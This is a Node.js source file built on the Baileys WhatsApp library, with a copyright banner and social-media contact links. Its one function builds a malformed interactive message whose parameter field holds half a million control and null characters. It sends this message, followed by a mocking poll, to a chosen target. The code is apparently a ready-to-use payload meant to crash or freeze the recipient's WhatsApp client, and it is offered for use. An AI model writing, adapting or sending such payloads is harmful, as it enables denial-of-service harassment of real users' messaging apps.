/*
 * © 2026 Legend Bahirava (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://www.youtube.com/@bahiravabahirava-e1p5m
 * Instagram : LG_Bahirava
 * Telegram  : https://t.me/LG_BAHIRAVA
 * WhatsApp  : +94704703791
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function test(SYxS7, target) {
   const nameVnX = ["address_message", "galaxy_message", "call_permission_request"];

   let vnxPayload = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "VnX Delay New Cuyy",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   let pollData = {
     pollCreationMessage: {
       name: "Emak lu siapa?",
       options: [
         { optionName: "Julee", optionHash: Buffer.from("Yanto").toString('base64') },
         { optionName: "Syapril", optionHash: Buffer.from("ah aj").toString('base64') }
       ],
       selectableOptionsCount: 1,
       pollType: "REGULAR",
       timestamp: Date.now()
     }
   };

   try {
     await SYxS7.relayMessage(target, vnxPayload, { participant: { jid: target } });
     await SYxS7.relayMessage(target, pollData, { participant: { jid: target } });
     
     console.log("Berhasil mengirim payload dan poll ke:", target);
   } catch (error) {
     console.error("Gagal mengirim:", error);
   }
}

module.exports = { test };
